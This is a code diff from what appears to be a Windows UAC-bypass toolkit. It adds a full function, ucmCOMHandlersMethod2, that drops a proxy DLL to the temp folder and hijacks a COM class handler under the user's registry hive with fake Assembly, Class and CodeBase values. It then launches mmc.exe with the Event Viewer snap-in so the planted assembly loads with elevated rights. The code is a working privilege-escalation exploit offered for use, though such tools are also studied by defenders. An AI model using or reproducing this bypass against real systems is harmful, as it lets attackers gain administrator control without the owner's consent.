@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.87
+*  VERSION:     2.88
 *
-*  DATE:        19 Jan 2018
+*  DATE:        11 May 2018
 *
 *  Hybrid UAC bypass methods.
 *
@@ -2330,6 +2330,243 @@ BOOL ucmBitlockerRCMethod(
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
+
+    return bResult;
+}
+
+/*
+* ucmCOMHandlersMethod2
+*
+* Purpose:
+*
+* Bypass UAC using fake COM class handler.
+* https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-bypass-UAC/
+* https://offsec.provadys.com/UAC-bypass-dotnet.html
+*
+*/
+BOOL ucmCOMHandlersMethod2(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL bCond = FALSE, bResult = FALSE, bNeedCleanup = FALSE, bRemoveFile = FALSE;
+
+    DWORD cbData = 0;
+    LRESULT lResult;
+
+    WCHAR *s, *d;
+
+    HKEY SourceKey = NULL, DestKey = NULL;
+
+    WCHAR szBuffer[MAX_PATH * 2], szKey[MAX_PATH * 2];
+    WCHAR szConvertedName[MAX_PATH * 3];
+
+    SHELLEXECUTEINFO shinfo;
+
+    do {
+
+        //
+        // Drop Fujinami to the %temp%
+        //
+        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcat(szBuffer, FUJINAMI_DLL);
+        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
+            break;
+
+        bRemoveFile = TRUE;
+
+        //
+        // Copy existing COM handler entry.
+        //
+        _strcpy(szKey, TEXT("CLSID\\"));
+        _strcat(szKey, T_MMCFrameworkSnapInFactory);
+
+        lResult = RegOpenKeyEx(HKEY_CLASSES_ROOT, szKey, 0, KEY_READ, &SourceKey);
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        _strcpy(szKey, T_REG_SOFTWARECLASSESCLSID);
+        _strcat(szKey, T_MMCFrameworkSnapInFactory);
+
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
+            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &DestKey, NULL);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        bNeedCleanup = TRUE;
+
+        lResult = RegCopyTree(SourceKey, NULL, DestKey);
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        RegCloseKey(SourceKey);
+        SourceKey = NULL;
+
+        RegCloseKey(DestKey);
+        DestKey = NULL;
+
+        //
+        // Modify entry.
+        //
+        _strcpy(szKey, T_REG_SOFTWARECLASSESCLSID);
+        _strcat(szKey, T_MMCFrameworkSnapInFactory);
+        _strcat(szKey, T_REG_INPROCSERVER32);
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
+            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &SourceKey, NULL);
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Set Assembly value.
+        //
+        cbData = (DWORD)((1 + _strlen(T_FUJINAMI_ASSEMBLY)) * sizeof(WCHAR));
+        lResult = RegSetValueEx(
+            SourceKey,
+            T_ASSEMBLY,
+            0,
+            REG_SZ,
+            (BYTE*)T_FUJINAMI_ASSEMBLY,
+            cbData);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Set Class value.
+        //
+        cbData = (DWORD)((1 + _strlen(T_FUJINAMI_CLASS)) * sizeof(WCHAR));
+        lResult = RegSetValueEx(
+            SourceKey,
+            T_CLASS,
+            0,
+            REG_SZ,
+            (BYTE*)T_FUJINAMI_CLASS,
+            cbData);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Set CodeBase value.
+        //
+        RtlSecureZeroMemory(szConvertedName, sizeof(szConvertedName));
+        _strcpy(szConvertedName, T_FILE_PREP);
+
+        s = szBuffer;
+        d = _strend(szConvertedName);
+
+        while (*s != 0) {
+            if (*s == L'\\') {
+                *d = L'/';
+                d++;
+                *d = L'/';
+                d++;
+            }
+            else {
+                *d = *s;
+                d++;
+            }
+            s++;
+        }
+
+        cbData = (DWORD)((1 + _strlen(szConvertedName)) * sizeof(WCHAR));
+        lResult = RegSetValueEx(
+            SourceKey,
+            T_CODEBASE,
+            0,
+            REG_SZ,
+            (BYTE*)szConvertedName,
+            cbData);
+
+        RegCloseKey(SourceKey);
+        SourceKey = NULL;
+
+        _strcpy(szKey, T_REG_SOFTWARECLASSESCLSID);
+        _strcat(szKey, T_MMCFrameworkSnapInFactory);
+        _strcat(szKey, T_REG_INPROCSERVER32);
+        _strcat(szKey, TEXT("\\3.0.0.0"));
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKey, 0, NULL,
+            REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &SourceKey, NULL);
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Set CodeBase value.
+        // cbData unchanged.
+        //
+        lResult = RegSetValueEx(
+            SourceKey,
+            T_CODEBASE,
+            0,
+            REG_SZ,
+            (BYTE*)szConvertedName,
+            cbData);
+
+        //
+        // Set Assembly value.
+        //
+        cbData = (DWORD)((1 + _strlen(T_FUJINAMI_ASSEMBLY)) * sizeof(WCHAR));
+        lResult = RegSetValueEx(
+            SourceKey,
+            T_ASSEMBLY,
+            0,
+            REG_SZ,
+            (BYTE*)T_FUJINAMI_ASSEMBLY,
+            cbData);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        //
+        // Set Class value.
+        //
+        cbData = (DWORD)((1 + _strlen(T_FUJINAMI_CLASS)) * sizeof(WCHAR));
+        lResult = RegSetValueEx(
+            SourceKey,
+            T_CLASS,
+            0,
+            REG_SZ,
+            (BYTE*)T_FUJINAMI_CLASS,
+            cbData);
+
+        if (lResult != ERROR_SUCCESS)
+            break;
+
+        RegCloseKey(SourceKey);
+        SourceKey = NULL;
+
+        //
+        // Run target.
+        //
+        RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+        shinfo.cbSize = sizeof(shinfo);
+        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+        shinfo.lpFile = MMC_EXE;
+        shinfo.lpParameters = EVENTVWR_MSC;
+        shinfo.nShow = SW_SHOW;
+        bResult = ShellExecuteEx(&shinfo);
+        if (bResult) {
+            WaitForSingleObject(shinfo.hProcess, 10000);
+            TerminateProcess(shinfo.hProcess, 0);
+            CloseHandle(shinfo.hProcess);
+        }
+
+    } while (bCond);
+
+    if (SourceKey != NULL) RegCloseKey(SourceKey);
+    if (DestKey != NULL) RegCloseKey(DestKey);
+
+    if (bNeedCleanup) {
+        _strcpy(szKey, T_REG_SOFTWARECLASSESCLSID);
+        _strcat(szKey, T_MMCFrameworkSnapInFactory);
+        supDeleteKeyRecursive(HKEY_CURRENT_USER, szKey);
+    }
+    if (bRemoveFile) {
+        _strcpy(szBuffer, g_ctx.szTempDirectory);
+        _strcat(szBuffer, FUJINAMI_DLL);
+        DeleteFile(szBuffer);
+    }
 
     return bResult;
 }
